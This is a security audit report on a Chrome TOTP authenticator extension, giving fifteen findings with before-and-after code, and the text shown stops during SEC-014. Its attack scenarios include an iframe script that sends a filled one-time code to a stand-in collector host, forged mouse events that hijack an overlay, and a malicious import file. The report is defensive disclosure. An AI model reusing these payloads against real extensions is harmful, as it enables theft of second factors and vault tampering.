# Security Audit Report
**Project:** AS Authenticator — https://github.com/hov172/as-authenticator
**Date:** 2026-09-30
**Auditor:** Claude Code (secure-webapp skill) assisted by Ayala Solutions
**Audit Type:** Static code review / dependency verification / repository configuration review
**Report Version:** 2.5
**Classification:** Internal — Handle Appropriately

---

## Executive Summary

AS Authenticator is a Chrome Manifest V3 TOTP authenticator that keeps an AES-256-GCM vault in `chrome.storage.local`, caches the master password in memory-only session storage while unlocked, scans QR codes from the current tab, and fills codes into pages through one-shot `chrome.scripting` injection under `activeTab`. Four review passes were run during one session: a full manual read of every source file, three independent reviewers with no shared context, and a checklist-driven pass against the OWASP-based audit list. No Critical or High issue was found. Fifteen findings were raised, the most significant being a Medium in autofill where a live code was written into every frame of the tab, including third-party iframes. Every finding was fixed, covered by a test, and pushed; the final review pass found nothing above Low, and that Low is closed. The application meets the security bar expected of a browser authenticator at commit `2a4d35e`.

### Finding Counts

| Severity | Total Found | Fixed | Open | Accepted Risk | False Positive |
|---|---|---|---|---|---|
| Critical | 0 | 0 | 0 | 0 | 0 |
| High | 0 | 0 | 0 | 0 | 0 |
| Medium | 2 | 2 | 0 | 0 | 0 |
| Low | 11 | 11 | 0 | 0 | 0 |
| Info | 2 | 2 | 0 | 0 | 0 |
| **Total** | **15** | **15** | **0** | **0** | **0** |

Four accepted risks inherent to any browser authenticator and three false positives are documented separately below.

### Key Risk Statements

- The most severe confirmed finding (SEC-001) let a third-party iframe embedded on a legitimate login page receive a valid one-time code when the user clicked Fill; it is fixed by filling only the single best-scoring frame.
- After remediation the trust boundary, vault cryptography, session lifecycle, import path, injected-page code, and DOM rendering were all independently verified sound.
- Nothing remains open. Dynamic testing against a real `activeTab` grant in branded Chrome and penetration testing were out of scope.

---

## Scope

### Reviewed

- `manifest.json` — permissions, content security policy, background worker, popup wiring
- `src/background.js` — service worker: message handlers, session and auto-lock lifecycle, vault persistence, region capture
- `src/vault.js` — V4 vault codec (PBKDF2-SHA256, AES-256-GCM), password minimum, import model validation
- `src/totp.js`, `src/otpauth.js` — RFC 6238 and `otpauth://` parsing
- `src/autofill.js`, `src/region.js` — code injected into arbitrary web pages
- `src/qr.js`, `src/categories.js`, `src/settings.js`
- `popup/popup.html`, `popup/popup.js`, `popup/popup.css` — the extension UI
- `vendor/jsQR.js` — verified byte-identical to the jsQR 1.4.0 npm release
- Git history for committed secrets, key material, or environment files
- `test/e2e/run.mjs` — to understand how the test extension stands in for `activeTab`

### Not Reviewed

- Dynamic testing under a real `activeTab` grant in branded Google Chrome. The end-to-end suite runs a test copy of the extension with `<all_urls>`, so which cross-origin frames `activeTab` reaches in production was reasoned about, not observed.
- Penetration testing, fuzzing, or memory forensics of the browser process.
- The former desktop companion app, whose vault format this extension shared at the time. Only the browser codec was reviewed.
- Chrome Web Store listing configuration, since no listing exists yet.

### Methodology

- **Approach:** Static source code review, manual trace of every trust boundary, adversarial verification of each candidate finding by an independent reviewer, unit and end-to-end test runs after every fix
- **Standards:** OWASP Top 10:2025, ASVS 5.0, OWASP Cheat Sheet Series
- **Tools:** `node --test` (unit), Chrome for Testing 154 driven over the DevTools Protocol (end-to-end), `npm pack` hash comparison for the vendored library, `git log -p` secret scan
- **Audit threshold:** the project has no npm dependencies, so `npm audit` has nothing to evaluate; the single vendored library was verified against upstream instead

---

## Risk Rating Matrix

| Severity | Definition | Response Target |
|---|---|---|
| **Critical** | Exploitable now with severe business impact: data breach, account takeover, RCE, cross-tenant write | Fix immediately — block release |
| **High** | Exploitable with material impact: auth bypass, persistent XSS, sensitive data leak, SSRF | Fix this sprint |
| **Medium** | Real risk but conditional or limited-impact: requires specific preconditions or attacker access | Fix this quarter |
| **Low** | Best-practice gap with minimal exploitability in isolation | Track and address opportunistically |
| **Info** | Observation only — no direct risk, but worth noting for future hardening | No action required |

---

## Findings Summary

| ID | Title | Severity | OWASP Category | Status | Location |
|---|---|---|---|---|---|
| SEC-001 | Autofill wrote the code into every frame of the tab | Medium | A01:2025 Broken Access Control | Fixed | `src/autofill.js` |
| SEC-002 | Import kept the file's password as the master password and stored an unvalidated model | Medium | A04:2025 Insecure Design | Fixed | `src/background.js` |
| SEC-003 | Vault import reachable while locked | Low | A01:2025 Broken Access Control | Fixed | `src/background.js` |
| SEC-004 | Region overlay accepted synthetic events and an unvalidated rectangle | Low | A03:2025 Injection | Fixed | `src/region.js`, `src/background.js` |
| SEC-005 | No minimum length for a new master password | Low | A07:2025 Authentication Failures | Fixed | `src/background.js` |
| SEC-006 | Import password collected in an unmasked native prompt | Low | A07:2025 Authentication Failures | Fixed | `popup/popup.js` |
| SEC-007 | Auto-lock could be undone by an in-flight decrypt | Low | A07:2025 Authentication Failures | Fixed | `src/background.js` |
| SEC-008 | Lock epoch captured after awaits still left a window | Low | A07:2025 Authentication Failures | Fixed | `src/background.js` |
| SEC-009 | Parked QR capture outlived a lock and never expired | Low | A02:2025 Security Misconfiguration | Fixed | `src/background.js`, `popup/popup.js` |
| SEC-010 | Region capture did not require the active top frame | Low | A01:2025 Broken Access Control | Fixed | `src/background.js` |
| SEC-011 | Region capture accepted while the vault was locked | Low | A01:2025 Broken Access Control | Fixed | `src/background.js` |
| SEC-012 | Import validation missed period, secret, and category shapes | Low | A03:2025 Injection | Fixed | `src/vault.js` |
| SEC-013 | CSP allowed plugins from the extension origin | Low | A02:2025 Security Misconfiguration | Fixed | `manifest.json` |
| SEC-014 | Message handler lookup on a plain object reached prototype keys | Info | A02:2025 Security Misconfiguration | Fixed | `src/background.js` |
| SEC-015 | Base64 encoding overflowed the stack on large vaults | Info | Reliability (not an OWASP category) | Fixed | `src/vault.js` |

---

## Confirmed Findings

---

### SEC-001 — Autofill wrote the code into every frame of the tab

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Fixed |
| **Location** | `src/autofill.js` (`fillTab`, `injectFill`) |
| **Affected Version** | `cdf8c91` and earlier |
| **Fixed In** | `f2bac3a` |

#### Description

`fillTab` injected the fill function with `allFrames: true`. Each frame independently chose its own best candidate input and wrote the code into it, and only afterwards did the caller check whether any frame reported success. Nothing stopped after the first fill, so a code destined for the login form was also written into any other frame that happened to contain a plausible field.

#### Evidence

```js
// Vulnerable code (before fix)
export async function fillTab(tabId, code) {
  let results;
  try { results = await chrome.scripting.executeScript({ target: { tabId, allFrames: true }, func: injectFill, args: [code] }); }
  catch (err) { throw new Error(fillBlockedReason(err.message)); }
  if (!results.some((r) => r.result)) throw new Error('No code field found on this page');
}
```

#### Attack Scenario

**Threat Actor:** A third-party widget or ad provider whose iframe is embedded on a legitimate login page, or anyone who has compromised such a provider.

**Prerequisites:** The provider's frame contains a visible input that scores above zero in the heuristic: `autocomplete="one-time-code"`, `inputmode="numeric"`, or a name, id, placeholder, or aria-label matching words such as `otp`, `code`, `token`, or `verify`. The user must click Fill while on that page.

**Step-by-step exploitation:**

1. The provider adds a small visible input named `token` to its widget, which ships on many sites' login pages.
2. The user reaches a real login page, opens the popup, and clicks Fill for the matching account.
3. The extension injects into every frame. The login form's real field is filled, and so is the widget's field, with `input` and `change` events dispatched.
4. The widget's script reads its own input on `change` and sends the value home.
5. The provider now holds a valid code for roughly thirty seconds and can race the user's submit if they already hold the password.

**Concrete example payload or request:**
```html
<!-- inside the third-party iframe -->
<input name="token" placeholder="Enter code">
<script>document.querySelector('[name=token]').addEventListener('change', e => fetch('https://collector.example/c?v=' + e.target.value));</script>
```

**Business Impact:** Loss of the second factor for the user's account for one code window. Combined with a leaked password, account takeover on the target site.

**Real-world precedent:** Password-manager autofill into cross-origin iframes has been a recurring vulnerability class; a 2017 study of browser and extension autofill (Acar et al., "No Boundaries") showed third-party scripts harvesting autofilled credentials from hidden fields.

#### Remediation Applied

Filling is now two passes. Every frame first runs the same function in probe mode, which reports the best candidate's score without ever receiving the code. The caller picks one winning frame, with the page itself winning ties over any iframe, and injects the fill into that frame only.

```js
// Fixed code (after fix)
export async function fillTab(tabId, code) {
  const inject = (target, args) => chrome.scripting.executeScript({ target, func: injectFill, args });
  let filled;
  try {
    const best = pickFrame(await inject({ tabId, allFrames: true }, ['', true]));
    filled = best ? (await inject({ tabId, frameIds: [best.frameId] }, [code]))[0]?.result : false;
  } catch (err) { throw new Error(fillBlockedReason(err.message)); }
  if (!filled) throw new Error('No code field found on this page');
}

export const pickFrame = (results) => results.filter((r) => r.result > 0).sort((a, b) => b.result - a.result || a.frameId - b.frameId)[0] ?? null;
```

**Fix rationale:** The root cause was fan-out with no selection step. Selecting one frame before the code leaves the extension removes the exposure regardless of what any other frame contains.

#### Verification

- Unit test `only the best-scoring frame is filled, the page itself on a tie` in `test/autofill.test.js` passes.
- End-to-end checks `autofill picks the one-time-code field with nothing focused`, `fill works on a page with blocked iframes`, and `autofill spreads digits across focused split boxes` pass in Chrome for Testing (39/39 suite).

---

### SEC-002 — Import kept the file's password as the master password and stored an unvalidated model

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A04:2025 – Insecure Design |
| **Status** | Fixed |
| **Location** | `src/background.js` (`importVault`) |
| **Affected Version** | `f2bac3a` and earlier |
| **Fixed In** | `86207a9` |

#### Description

`importVault` decrypted the file with the password the user typed, stored the file verbatim as the vault, and made that password the session password. Every later write re-encrypted under it, so a backup with a three-character password silently became a vault with a three-character password, bypassing the 12-character minimum introduced in SEC-005. The decrypted model was also stored without any shape check.

#### Evidence

```js
// Vulnerable code (before fix)
async importVault({ vault, password }) {
  await requireSession();
  const { model, changed } = repairCategories(await decryptVault(vault, password));
  await chrome.storage.local.set({ vault });
  session = { model, password };
  await chrome.storage.session.set({ password });
  if (changed) await persist(model);
  await armAutoLock();
  return { ok: true };
},
```

#### Attack Scenario

**Threat Actor:** Anyone who later obtains a copy of the Chrome profile directory (stolen laptop, backup exposure, malware with file access).

**Prerequisites:** The user once imported a vault file that had a weak password, for example an old desktop backup.

**Step-by-step exploitation:**

1. The user imports `old-backup.2fa`, whose password is `abc`.
2. The extension stores the file and switches the session password to `abc`. Every subsequent write re-encrypts the full account set under `abc`.
3. Months later the attacker copies `chrome.storage.local` from the profile's LevelDB files.
4. The attacker runs PBKDF2-SHA256 at 600k iterations against a short dictionary; `abc` falls in seconds.
5. Every TOTP secret in the vault is recovered.

**Concrete example payload or request:**
```
Import file: any V4 envelope encrypted with password "abc"
Result before fix: chrome.storage.session.password === "abc"; all later persist() calls use it
```

**Business Impact:** Full compromise of every second factor the user stored, with no indication in the UI that the vault's protection had weakened.

**Real-world precedent:** Offline cracking of exported authenticator and password-manager vaults after profile theft is the standard attack on local vaults; the 2022 LastPass incident showed how weak master passwords on stolen encrypted blobs translate to full recovery.

#### Remediation Applied

The file's password now only opens the file. The decrypted model is shape-checked (see SEC-012) and re-encrypted under the current master password by the normal `persist` path, which also re-arms auto-lock. The session password never changes on import.

```js
// Fixed code (after fix)
async importVault({ vault, password }) {
  await requireSession();
  const { model } = repairCategories(assertModel(await decryptVault(vault, password)));
  return persist(model);
},
```

**Fix rationale:** The vault's protection should depend only on the master password the user chose under the enforced minimum, never on the password of whatever file was imported.

#### Verification

- End-to-end check `desktop vault imported: accounts, 8-digit SHA-256 code, category` passes, and the following export decrypts with the master password rather than the file password.
- Unit test `imported models are shape-checked before they replace the vault` passes.

---

### SEC-003 — Vault import reachable while locked

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Fixed |
| **Location** | `src/background.js` (`importVault`) |
| **Affected Version** | `cdf8c91` and earlier |
| **Fixed In** | `f2bac3a` |

#### Description

The import handler did not require an unlocked session. The UI only showed Import in the unlocked view, but the message handler itself would replace the stored vault from a locked state.

#### Evidence

```js
// Vulnerable code (before fix)
async importVault({ vault, password }) {
  const { model, changed } = repairCategories(await decryptVault(vault, password));
  await chrome.storage.local.set({ vault });
```

#### Attack Scenario

**Threat Actor:** Someone with physical access to an unlocked browser while the extension is locked.

**Prerequisites:** Ability to open the popup and drive its DevTools, since only extension pages can send messages.

**Step-by-step exploitation:**

1. The attacker opens the popup's DevTools console.
2. They send `chrome.runtime.sendMessage({ type: 'importVault', vault: <their file>, password: <their password> })`.
3. The user's vault is overwritten with the attacker's and the extension unlocks on the attacker's password.
4. The user's own accounts are gone with no recovery path other than an earlier export.

**Concrete example payload or request:**
```js
chrome.runtime.sendMessage({ type: 'importVault', vault: attackerEnvelopeJson, password: 'attacker' })
```

**Business Impact:** Destructive loss of the user's second factors. No secret disclosure.

**Real-world precedent:** Unauthenticated administrative handlers guarded only by UI visibility are a common class in extension and single-page-app reviews.

#### Remediation Applied

```js
// Fixed code (after fix)
async importVault({ vault, password }) {
  await requireSession();
```

**Fix rationale:** The handler now enforces the state the UI implied.

#### Verification

- End-to-end import flow passes only from the unlocked view; the `requireSession` guard throws `Locked` otherwise, matching every other data handler.

---

### SEC-004 — Region overlay accepted synthetic events and an unvalidated rectangle

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A03:2025 – Injection |
| **Status** | Fixed |
| **Location** | `src/region.js` (`injectRegionSelector`, `validRegion`), `src/background.js` (`onRegionSelected`) |
| **Affected Version** | `cdf8c91` and earlier |
| **Fixed In** | `f2bac3a` |

#### Description

The drag overlay injected into the page handled `mousedown`, `mousemove`, `mouseup`, and `keydown` without checking `event.isTrusted`, so page script could dispatch its own events on the overlay. The resulting `regionSelected` message carried a rectangle and device pixel ratio that the worker used without validation.

#### Evidence

```js
// Vulnerable code (before fix)
overlay.onmouseup = (e) => {
  if (!start) return;
  const rect = { x: Math.min(start.x, e.clientX), ... };
  finish(rect.w > 8 && rect.h > 8 ? rect : null);
};
// worker
async function onRegionSelected(msg, sender) {
  const shot = await chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' });
  const pendingCapture = await cropCapture(shot, msg.rect, msg.dpr);
```

#### Attack Scenario

**Threat Actor:** A hostile page the user has chosen to scan a QR code from.

**Prerequisites:** The user clicks "Select QR code on this page" on that page.

**Step-by-step exploitation:**

1. The page detects the overlay element appearing in its DOM.
2. It dispatches synthetic `mousedown` and `mouseup` events with coordinates covering a hidden QR image of its choosing.
3. The worker captures and crops that region, the popup reopens and decodes it, and an attacker-chosen account is added to the vault under a trusted-looking issuer name.

**Concrete example payload or request:**
```js
const o = document.getElementById('as-authenticator-region');
o.dispatchEvent(new MouseEvent('mousedown', { clientX: 10, clientY: 10, bubbles: true }));
o.dispatchEvent(new MouseEvent('mouseup', { clientX: 210, clientY: 210, bubbles: true }));
```

**Business Impact:** Vault pollution with an attacker-controlled secret; no disclosure of existing secrets.

**Real-world precedent:** Synthetic-event abuse of injected extension UI is the same class as clickjacking against in-page overlays.

#### Remediation Applied

```js
// Fixed code (after fix)
overlay.onmousedown = (e) => { if (!e.isTrusted) return; ... };
overlay.onmouseup = (e) => { if (!start || !e.isTrusted) return; ... };
export function validRegion(msg) {
  const { rect, dpr } = msg ?? {};
  const finite = (v) => typeof v === 'number' && Number.isFinite(v) && v >= 0;
  return !!rect && ['x', 'y', 'w', 'h'].every((k) => finite(rect[k])) && rect.w > 0 && rect.h > 0 && finite(dpr) && dpr > 0 && dpr <= MAX_DPR;
}
```

**Fix rationale:** Page script cannot create trusted events, so the selection can only come from real input, and the worker no longer trusts the message's shape.

#### Verification

- Unit test `region messages are validated before the tab is captured` passes.
- End-to-end checks `region drag captured and cropped the QR area` and `popup consumed the pending capture and added the account` pass using real trusted input through the DevTools Protocol.

---

### SEC-005 — No minimum length for a new master password

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A07:2025 – Identification and Authentication Failures |
| **Status** | Fixed |
| **Location** | `src/background.js` (`unlock`), `src/vault.js` (`assertNewPassword`) |
| **Affected Version** | `cdf8c91` and earlier |
| **Fixed In** | `f2bac3a` |

#### Description

The first unlock created the vault with whatever password was typed. The encrypted envelope sits on disk in the profile directory, so password strength is the only defense against offline guessing.

#### Evidence

```js
// Vulnerable code (before fix)
async unlock({ password }) {
  const { vault } = await chrome.storage.local.get('vault');
  const { model, changed } = repairCategories(vault ? await decryptVault(vault, password) : emptyModel());
```

#### Attack Scenario

**Threat Actor:** Anyone who obtains the profile directory.

**Prerequisites:** The user chose a short password at first unlock.

**Step-by-step exploitation:**

1. The user creates the vault with password `1234`.
2. An attacker copies the LevelDB files holding `chrome.storage.local`.
3. A dictionary run at 600k PBKDF2 iterations recovers `1234` within minutes.
4. All stored secrets are decrypted.

**Concrete example payload or request:**
```
unlock { password: "1234" } on an empty vault → vault created
```

**Business Impact:** Loss of every second factor after profile theft.

**Real-world precedent:** Same class as SEC-002.

#### Remediation Applied

```js
// Fixed code (after fix)
export const MIN_PASSWORD_LENGTH = 12;
export function assertNewPassword(password) {
  if (typeof password !== 'string' || password.length < MIN_PASSWORD_LENGTH) throw new Error(`Master password must be at least ${MIN_PASSWORD_LENGTH} characters`);
}
// unlock
if (!vault) assertNewPassword(password);
```

**Fix rationale:** Enforced at creation, where it cannot lock existing users out; the lock screen states the requirement.

#### Verification

- Unit test `a new vault needs a master password of at least 12 characters` passes.
- End-to-end check `short master password refused when creating the vault` passes.

---

### SEC-006 — Import password collected in an unmasked native prompt

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A07:2025 – Identification and Authentication Failures |
| **Status** | Fixed |
| **Location** | `popup/popup.js`, `popup/popup.html` |
| **Affected Version** | `cdf8c91` and earlier |
| **Fixed In** | `f2bac3a` |

#### Description

The import flow used `window.prompt`, which displays typed text in the clear and gave no confirmation that the current vault would be replaced.

#### Evidence

```js
// Vulnerable code (before fix)
const password = prompt('Password for the imported vault');
```

#### Attack Scenario

**Threat Actor:** Shoulder surfer or screen-recording software.

**Prerequisites:** Visibility of the user's screen during import.

**Step-by-step exploitation:**

1. The user picks a file to import.
2. The native prompt shows the password as plain text while typed.
3. The observer records it and later decrypts the same backup file.

**Concrete example payload or request:** Not applicable; observation only.

**Business Impact:** Disclosure of a backup's password.

**Real-world precedent:** Standard UI guidance against unmasked credential entry.

#### Remediation Applied

An inline form with `<input type="password">`, the filename, a warning that accounts not in the file are lost, and explicit Replace and Cancel buttons.

```js
// Fixed code (after fix)
$('import-form').onsubmit = async (e) => {
  e.preventDefault();
  const file = importFile, password = $('import-password').value;
  if (!file) return;
  try { await send({ type: 'importVault', vault: await file.text(), password }); closeImport(); ... }
```

**Fix rationale:** Masked entry plus an explicit confirmation makes the destructive action deliberate.

#### Verification

- End-to-end check `import asks for the file password in a masked field before replacing` passes.

---

### SEC-007 — Auto-lock could be undone by an in-flight decrypt

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A07:2025 – Identification and Authentication Failures |
| **Status** | Fixed |
| **Location** | `src/background.js` (`getSession`, `persist`, `lock`) |
| **Affected Version** | `f2bac3a` and earlier |
| **Fixed In** | `86207a9` |

#### Description

The auto-lock alarm called `lock()` outside the write queue. After a worker restart, `getSession` spent about 1.5 seconds decrypting; if the alarm fired inside that window, the decrypt finished and restored the session in memory after the lock had cleared it.

#### Evidence

```js
// Vulnerable code (before fix)
async function getSession() {
  if (session) return session;
  const { password } = await chrome.storage.session.get('password');
  if (!password) return null;
  const { vault } = await chrome.storage.local.get('vault');
  session = { model: await decryptVault(vault, password), password };
  return session;
}
```

#### Attack Scenario

**Threat Actor:** Someone at the keyboard after the user walked away.

**Prerequisites:** The auto-lock alarm fires during a cold worker's decrypt, which happens when the popup is opened right at the timeout.

**Step-by-step exploitation:**

1. The user's auto-lock is due at T. The worker has been unloaded by Chrome.
2. At T minus one second someone opens the popup; the worker starts decrypting.
3. At T the alarm fires and `lock()` clears memory and session storage.
4. The decrypt completes and sets `session` again. The popup shows accounts and secrets.
5. The session persists until Chrome unloads the worker.

**Concrete example payload or request:** Timing only; no payload.

**Business Impact:** The vault appears unlocked past the timeout the user configured.

**Real-world precedent:** Time-of-check to time-of-use races in lock state are a known class in password-manager audits.

#### Remediation Applied

A lock epoch counter. `lock()` increments it; work that awaits captures it and refuses to restore the session if it changed.

```js
// Fixed code (after fix)
let lockEpoch = 0;
async function lock() { lockEpoch += 1; session = null; ... }
// getSession
const model = await decryptVault(vault, password);
if (epoch !== lockEpoch) return null;
```

**Fix rationale:** The lock becomes the authority regardless of what was in flight.

#### Verification

- End-to-end checks `lock returns to the password screen` and `stays unlocked across popup reopen (session storage)` pass; unit suite 20/20.

---

### SEC-008 — Lock epoch captured after awaits still left a window

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A07:2025 – Identification and Authentication Failures |
| **Status** | Fixed |
| **Location** | `src/background.js` (`getSession`, `requireSession`, `persist`) |
| **Affected Version** | `86207a9` |
| **Fixed In** | `1950538` |

#### Description

The SEC-007 fix read the epoch after the storage reads in `getSession` and after `requireSession` in `persist`. A lock landing before the capture bumped the epoch first, so the comparison passed and stale state was restored. `requireSession` also re-armed the alarm after a lock could have cleared it.

#### Evidence

```js
// Vulnerable code (before fix)
const { vault } = await chrome.storage.local.get('vault');
if (!vault) { await lock(); return null; }
const epoch = lockEpoch;            // too late: two awaits already passed
```

#### Attack Scenario

Same actor and outcome as SEC-007, with the window narrowed to the storage reads and alarm arming. Steps identical; the alarm must fire during those few milliseconds.

**Concrete example payload or request:** Timing only.

**Business Impact:** As SEC-007, with a smaller window.

**Real-world precedent:** As SEC-007.

#### Remediation Applied

```js
// Fixed code (after fix)
async function getSession() {
  if (session) return session;
  const epoch = lockEpoch;  // before the first await
  ...
}
async function requireSession() {
  const epoch = lockEpoch;
  const s = await getSession();
  if (!s) throw new Error('Locked');
  await armAutoLock();
  if (epoch !== lockEpoch) { await chrome.alarms.clear(LOCK_ALARM); throw new Error('Locked'); }
  return s;
}
async function persist(model) {
  const epoch = lockEpoch;
  const { password } = await requireSession();
```

**Fix rationale:** Capturing before any await closes every interleaving, and a lock that lands while arming leaves no stale alarm behind.

#### Verification

- Unit suite 20/20 and end-to-end 39/39 after the change.

---

### SEC-009 — Parked QR capture outlived a lock and never expired

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed |
| **Location** | `src/background.js` (`onRegionSelected`, `lock`), `popup/popup.js` (`consumePendingCapture`) |
| **Affected Version** | `f2bac3a` and earlier |
| **Fixed In** | `86207a9` |

#### Description

When the popup could not be reopened after a region drag, the cropped screenshot, which contains a TOTP secret as a QR code, stayed in session storage with no expiry, survived locking, and was auto-added at the next unlock however much later.

#### Evidence

```js
// Vulnerable code (before fix)
await chrome.storage.session.set({ pendingCapture });
// popup
const { pendingCapture } = await chrome.storage.session.get('pendingCapture');
if (!pendingCapture) return;
await addFromImage(await (await fetch(pendingCapture)).blob());
```

#### Attack Scenario

**Threat Actor:** Someone who later unlocks the browser session, or forensic access to process memory.

**Prerequisites:** A region drag whose popup reopen failed, followed by a lock.

**Step-by-step exploitation:**

1. The user drags a region; `chrome.action.openPopup` fails and a badge appears.
2. The user does not click the badge and the vault auto-locks.
3. The secret-bearing PNG remains in session storage indefinitely.
4. Hours later the vault is unlocked and the stale capture is added without a prompt.

**Concrete example payload or request:** Not applicable.

**Business Impact:** A plaintext secret retained longer than intended; an unexpected account added.

**Real-world precedent:** Retention of decrypted secrets beyond the lock boundary is a routine password-manager finding.

#### Remediation Applied

```js
// Fixed code (after fix)
await chrome.storage.session.set({ pendingCapture, pendingAt: Date.now() });
// lock()
await chrome.storage.session.remove(['password', 'pendingCapture', 'pendingAt']);
// popup
if (!(Date.now() - pendingAt < PENDING_CAPTURE_MS)) return msg('main', 'That QR selection expired, select it again', true);
```

**Fix rationale:** Lock now clears every secret-bearing value, and a capture is honoured for five minutes only.

#### Verification

- End-to-end `popup consumed the pending capture and added the account` still passes within the window; unit suite 20/20.

---

### SEC-010 — Region capture did not require the active top frame

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Fixed |
| **Location** | `src/background.js` (`onRegionSelected`) |
| **Affected Version** | `f2bac3a` and earlier |
| **Fixed In** | `86207a9` |

#### Description

The worker captured `sender.tab.windowId` without checking that the sender was the active tab's top frame. If the user switched tabs between the drag and the capture, one tab's rectangle was cropped from another tab's screenshot.

#### Evidence

```js
// Vulnerable code (before fix)
if (!sender.tab?.windowId || !validRegion(msg)) throw new Error('Invalid region');
```

#### Attack Scenario

**Threat Actor:** Timing accident rather than an attacker; a hostile page cannot force the switch.

**Prerequisites:** Tab switch within the double animation frame between mouse-up and the message.

**Step-by-step exploitation:**

1. The user finishes a drag on tab A and immediately switches to tab B.
2. The worker captures tab B and crops A's rectangle from it.
3. The crop of B, which may contain unrelated on-screen data, is stored and decoded.

**Concrete example payload or request:** Not applicable.

**Business Impact:** A screenshot fragment of the wrong tab retained in session storage.

**Real-world precedent:** Capture-of-wrong-surface bugs in screenshot features.

#### Remediation Applied

```js
// Fixed code (after fix)
if (sender.frameId !== 0 || !sender.tab?.active || !sender.tab.windowId || !validRegion(msg)) throw new Error('Invalid region');
```

**Fix rationale:** Only the active tab's top document may request a capture.

#### Verification

- End-to-end region checks pass; unit suite 20/20.

---

### SEC-011 — Region capture accepted while the vault was locked

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A01:2025 – Broken Access Control |
| **Status** | Fixed |
| **Location** | `src/background.js` (`onRegionSelected`) |
| **Affected Version** | `86207a9` and earlier |
| **Fixed In** | `1950538` |

#### Description

An overlay left open across an auto-lock could still complete a drag, and the worker parked a secret-bearing screenshot while locked.

#### Evidence

```js
// Vulnerable code (before fix)
async function onRegionSelected(msg, sender) {
  if (sender.frameId !== 0 || ...) throw new Error('Invalid region');
  const shot = await chrome.tabs.captureVisibleTab(...);
```

#### Attack Scenario

**Threat Actor:** As SEC-009.

**Prerequisites:** Overlay open when the auto-lock fires.

**Step-by-step exploitation:**

1. The user starts a region selection and is interrupted; the vault locks.
2. Later they complete the drag.
3. The worker stores the crop even though the vault is locked.

**Concrete example payload or request:** Not applicable.

**Business Impact:** Secret material handled outside an unlocked session.

**Real-world precedent:** As SEC-009.

#### Remediation Applied

```js
// Fixed code (after fix)
if (!(await getSession())) throw new Error('Locked');
```

**Fix rationale:** Every path that handles secret material now requires an unlocked vault.

#### Verification

- Unit suite 20/20 and end-to-end 39/39.

---

### SEC-012 — Import validation missed period, secret, and category shapes

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A03:2025 – Injection |
| **Status** | Fixed |
| **Location** | `src/vault.js` (`assertModel`) |
| **Affected Version** | `86207a9` |
| **Fixed In** | `1950538` |

#### Description

The first version of `assertModel` accepted any truthy period, any base64 string including ones that decode to zero bytes, and did not check category entries. A crafted file with a known password could pass and be stored, after which the account list could not render.

#### Evidence

```js
// Vulnerable code (before fix)
if (!HASH_MODES.includes(a.HashMode) || !DIGITS.includes(a.TotpSize) || !(a.Period > 0)) bad(...);
```

#### Attack Scenario

**Threat Actor:** Someone who convinces the user to import a file they supply.

**Prerequisites:** The user confirms the replacement.

**Step-by-step exploitation:**

1. The attacker supplies a file with `Period: 1e-320` for one account.
2. Validation passes, the file replaces the vault.
3. Rendering computes an infinite counter and `BigInt` throws; the whole list is blank.
4. The user has no access to any account until they import a good backup.

**Concrete example payload or request:**
```json
{ "Collection": [{ "Label": "x", "SecretByteArray": "====", "TotpSize": 6, "Period": 1e-320, "HashMode": 0 }] }
```

**Business Impact:** Loss of access to stored second factors until recovery.

**Real-world precedent:** Malformed-import denial in local vault applications.

#### Remediation Applied

```js
// Fixed code (after fix)
const isBase64 = (v) => { if (typeof v !== 'string') return false; try { return atob(v).length > 0; } catch { return false; } };
const isPeriod = (v) => Number.isInteger(v) && v >= 1 && v <= MAX_PERIOD;
const isCategory = (c) => typeof c?.Guid === 'string' && typeof c.Name === 'string';
```

**Fix rationale:** Validation now covers everything the popup and TOTP code consume, so anything that passes renders.

#### Verification

- Unit test `imported models are shape-checked before they replace the vault` covers each rejected shape and passes.

---

### SEC-013 — CSP allowed plugins from the extension origin

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed |
| **Location** | `manifest.json` |
| **Affected Version** | `1950538` and earlier |
| **Fixed In** | `2a4d35e` |

#### Description

The extension-pages policy used Chrome's default `object-src 'self'`. No page embeds plugins, so the directive only left a sink nothing needs.

#### Evidence

```json
"extension_pages": "script-src 'self'; object-src 'self'"
```

#### Attack Scenario

**Threat Actor:** None reachable today; defense in depth only.

**Prerequisites:** A future page that embeds an `<object>` from the extension origin.

**Step-by-step exploitation:** Not applicable in the current code.

**Concrete example payload or request:** Not applicable.

**Business Impact:** None today.

**Real-world precedent:** OWASP CSP guidance recommends `object-src 'none'`.

#### Remediation Applied

```json
"extension_pages": "script-src 'self'; object-src 'none'"
```

**Fix rationale:** Removes an unused capability.

#### Verification

- End-to-end 39/39 under the tightened policy.

---

### SEC-014 — Message handler lookup on a plain object reached prototype keys

| Field | Value |
|---|---|
| **Severity** | Info |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed |
| **Location** | `src/background.js` (message listener) |
| **Affected Version** | `cdf8c91` and earlier |
| **Fixed In** | `f2bac3a` |

#### Description

`handlers[msg.type]` resolved inherited keys such as `constructor`, which then threw a `TypeError` instead of the intended "Unknown message" reply. Only extension contexts can send messages, so there was no attack path.

#### Evidence

```js
// Before
const h = handlers[msg?.type];
```

#### Attack Scenario

**Threat Actor:** None; extension contexts only.

**Prerequisites, steps, payload, impact, precedent:** Not applicable.

#### Remediation Applied

```js
// After
const h = Object.hasOwn(handlers, msg?.type ?? '') ? handlers[msg.type] : null;
```

**Fix rationale:** Own-property lookup is the correct dispatch semantics.

#### Verification

